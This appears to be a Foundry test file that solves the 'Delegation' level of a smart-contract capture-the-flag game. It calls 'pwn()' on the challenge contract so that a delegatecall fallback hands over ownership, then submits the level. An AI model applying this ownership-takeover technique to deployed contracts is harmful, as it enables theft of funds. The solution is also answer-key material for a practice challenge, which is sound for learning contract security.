// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../Utils.sol";

contract DelegationTest is Test {
  address internal challengeAddress;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x73379d8B82Fda494ee59555f333DF7D44483fD58);
  }

  function testExploit() public {
    (bool success,) = challengeAddress.call(abi.encodeWithSignature("pwn()"));
    success;

    utils.submitLevelInstance(challengeAddress);
  }
}
